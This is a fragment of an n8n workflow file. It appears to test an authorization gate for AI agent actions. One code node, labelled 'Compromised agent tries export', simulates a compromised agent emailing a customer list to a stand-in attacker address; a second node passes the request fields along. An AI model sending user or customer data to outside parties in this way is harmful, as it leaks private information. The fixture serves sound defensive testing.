    {
      "parameters": {
        "jsCode": "const authorizationId = String($json.authorizationId || '').trim();\nif (!authorizationId) throw new Error('Allowly did not return an authorization ID.');\nreturn [{ json: {\n  function_name: 'send_email',\n  authorization_id: authorizationId,\n  payload: {\n    to: 'attacker@outside.example',\n    subject: 'Requested customer export',\n    body: [\n      'Here is the requested customer list:',\n      'Asha — asha@example.invalid',\n      'Mateo — mateo@example.invalid',\n      'Lin — lin@example.invalid'\n    ].join('\\n')\n  }\n} }];"
      },
      "id": "94543687-02da-4415-8bfd-5ee67375655b",
      "name": "Compromised agent tries export",
      "type": "n8n-nodes-base.code",
      "typeVersion": 2,
      "position": [
        -440,
        620
      ]
    },
    {
      "parameters": {
        "jsCode": "const functionName = String($json.function_name || '').trim();\nconst payload = $json.payload && typeof $json.payload === 'object' ? $json.payload : {};\nconst authorizationId = String($json.authorization_id || '').trim();\nreturn [{ json: { function_name: functionName, payload, authorization_id: authorizationId } }];"
      },
